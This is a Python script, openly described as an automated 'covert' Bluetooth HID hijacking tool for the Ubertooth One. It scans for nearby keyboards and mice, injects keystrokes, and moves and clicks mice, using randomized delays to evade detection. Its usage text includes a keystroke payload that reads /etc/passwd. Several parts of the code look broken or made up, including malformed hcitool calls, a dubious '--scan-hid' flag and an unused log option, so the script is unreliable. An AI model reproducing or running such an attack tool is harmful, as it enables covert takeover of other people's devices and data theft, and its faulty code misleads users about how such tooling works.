import argparse
import subprocess
import time
import json
import os
import random

"""
Ubertooth Bluetooth HID Hijack - Automated & Covert Mode

Features:
    - Automates full attack chain: Scan → Detect → Hijack → Inject Payloads.
    - Supports Covert Mode with randomized delays to avoid detection.
    - Intercepts & injects keystrokes into Bluetooth keyboards.
    - Hijacks Bluetooth mice for remote movement & clicks.
    - Logs all captured HID events for forensic tracking.
    - Auto-exploits Bluetooth keyboards & mice when detected.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool for direct Bluetooth HID injection.

Usage:
    - Run fully automated Bluetooth HID hijacking (Scan → Hijack → Inject):
      python ubertooth_hid_hijack.py --auto
    - Enable Covert Mode for stealthy attacks:
      python ubertooth_hid_hijack.py --auto --covert
    - Use a custom keystroke payload for Bluetooth keyboard injection:
      python ubertooth_hid_hijack.py --auto --payload "whoami; cat /etc/passwd"
    - Log all automated attacks & keystroke injections:
      python ubertooth_hid_hijack.py --auto --log hid_attacks.json
"""

LOG_FILE = "hid_attacks.json"

def log_event(event_data):
    """Logs Bluetooth HID attack events."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log HID event: {e}")

def scan_hid_devices():
    """Scans for Bluetooth HID devices (keyboards, mice)."""
    print("[INFO] Scanning for Bluetooth HID devices...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "--scan-hid"])
        devices = output.decode("utf-8").split("\n")

        detected_devices = []
        for line in devices:
            if "HID" in line:
                detected_devices.append(line.strip())
                print(f"[DETECTED] {line.strip()}")
                log_event({"timestamp": time.time(), "device": line.strip(), "type": "HID Device Found"})
        
        return detected_devices

    except Exception as e:
        print(f"[ERROR] Failed to scan HID devices: {e}")
        return []

def inject_keystrokes(target_mac, keystrokes, covert=False):
    """Injects keystrokes into a Bluetooth keyboard."""
    print(f"[INFO] Injecting keystrokes into {target_mac}...")

    try:
        if covert:
            delay = random.uniform(0.5, 2.0)
            print(f"[COVERT MODE] Delaying keystroke injection by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["hcitool", "cmd", "0x04", "0x05", keystrokes])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Keystroke Injection", "keystrokes": keystrokes})

    except Exception as e:
        print(f"[ERROR] Failed to inject keystrokes: {e}")

def control_mouse(target_mac, x_offset, y_offset, click, covert=False):
    """Moves the Bluetooth mouse and optionally clicks."""
    print(f"[INFO] Moving mouse to ({x_offset}, {y_offset}) on {target_mac}...")

    try:
        if covert:
            delay = random.uniform(1.0, 3.0)
            print(f"[COVERT MODE] Delaying mouse movement by {delay:.2f} seconds...")
            time.sleep(delay)

        movement_command = f"0x04 0x02 {x_offset} {y_offset}"
        subprocess.run(["hcitool", "cmd", movement_command])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Mouse Move", "x": x_offset, "y": y_offset})

        if click:
            subprocess.run(["hcitool", "cmd", "0x04", "0x01"])
            log_event({"timestamp": time.time(), "target": target_mac, "action": "Mouse Click"})

    except Exception as e:
        print(f"[ERROR] Failed to control mouse: {e}")

def automated_hid_attack(payload="whoami", covert=False):
    """Automatically scans, detects, and hijacks Bluetooth HID devices."""
    print("[INFO] Starting automated HID attack sequence...")
    
    devices = scan_hid_devices()
    
    if not devices:
        print("[WARNING] No Bluetooth HID devices found. Exiting.")
        return

    for device in devices:
        mac_address = device.split(" ")[1]  # Extract MAC address

        print(f"[ATTACK] Hijacking {mac_address}...")
        inject_keystrokes(mac_address, payload, covert)
        control_mouse(mac_address, random.randint(-500, 500), random.randint(-500, 500), click=True, covert=covert)

        if covert:
            stealth_delay = random.uniform(5.0, 15.0)
            print(f"[COVERT MODE] Sleeping for {stealth_delay:.2f} seconds before next attack...")
            time.sleep(stealth_delay)

    print("[SUCCESS] Automated HID attack sequence completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth HID Hijack - Automated Keystroke & Mouse Injection")
    parser.add_argument("--auto", action="store_true", help="Run automated HID attack sequence")
    parser.add_argument("--covert", action="store_true", help="Enable covert mode with randomized delays")
    parser.add_argument("--payload", type=str, default="whoami", help="Keystroke payload to inject into Bluetooth keyboard")
    parser.add_argument("--log", type=str, help="Log captured HID events for forensic tracking")

    args = parser.parse_args()

    if args.auto:
        automated_hid_attack(payload=args.payload, covert=args.covert)
    else:
        print("[ERROR] No valid mode selected!")
